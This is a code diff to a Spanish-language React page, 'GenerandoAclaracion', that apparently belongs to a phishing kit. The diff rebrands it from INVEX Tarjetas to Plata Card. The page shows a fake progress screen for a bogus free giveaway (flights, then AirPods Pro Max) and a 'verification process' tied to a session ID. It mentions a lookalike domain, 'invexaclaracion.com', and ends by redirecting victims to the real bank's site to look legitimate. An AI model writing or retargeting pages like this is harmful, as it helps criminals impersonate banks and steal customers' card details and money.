@@ -38,14 +38,14 @@ const GenerandoAclaracion: React.FC = () => {
     if (progress === 100) {
       const redirectTimeout = setTimeout(() => {
         if (isDirectAccess) {
-          // Si es acceso directo a invexaclaracion.com, redirigir a INVEX Tarjetas
-          window.location.href = 'https://www.invextarjetas.com.mx/index#/home';
+          // Si es acceso directo, redirigir a Plata Card
+          window.location.href = 'https://www.platacard.com/';
         } else if (hasSessionId) {
           // Si tiene un sessionId válido, redirigir al flujo normal del cliente
           setLocation(`/client/${sessionId}`);
         } else {
-          // Por defecto, redirigir a INVEX Tarjetas
-          window.location.href = 'https://www.invextarjetas.com.mx/index#/home';
+          // Por defecto, redirigir a Plata Card
+          window.location.href = 'https://www.platacard.com/';
         }
       }, 500);
 
@@ -62,7 +62,7 @@ const GenerandoAclaracion: React.FC = () => {
       />
       
       <h1 className="text-2xl font-bold mb-4 text-[#BE0046]">
-        {hasSessionId ? "Iniciando proceso de verificación" : "Procesando promoción de vuelos"}
+        {hasSessionId ? "Iniciando proceso de verificación" : "Procesando promoción de AirPods Pro Max"}
       </h1>
       
       <div className="w-full max-w-md mb-6">
@@ -79,7 +79,7 @@ const GenerandoAclaracion: React.FC = () => {
         {hasSessionId ? (
           <>
             <p className="mb-2">
-              Estamos preparando su proceso de verificación para la promoción de vuelos INVEX.
+              Estamos preparando su proceso de verificación para la promoción de AirPods Pro Max de Plata Card.
             </p>
             <p>
               Será redirigido a la plataforma segura en unos momentos. Por favor no cierre esta ventana.
@@ -88,10 +88,10 @@ const GenerandoAclaracion: React.FC = () => {
         ) : (
           <>
             <p className="mb-2">
-              Estamos procesando su registro para la promoción de vuelos gratis con INVEX.
+              Estamos procesando su registro para la promoción de AirPods Pro Max gratis con Plata Card.
             </p>
             <p>
-              Será redirigido al portal oficial de INVEX Tarjetas en unos momentos.
+              Será redirigido al portal oficial de Plata Card en unos momentos.
             </p>
           </>
         )}
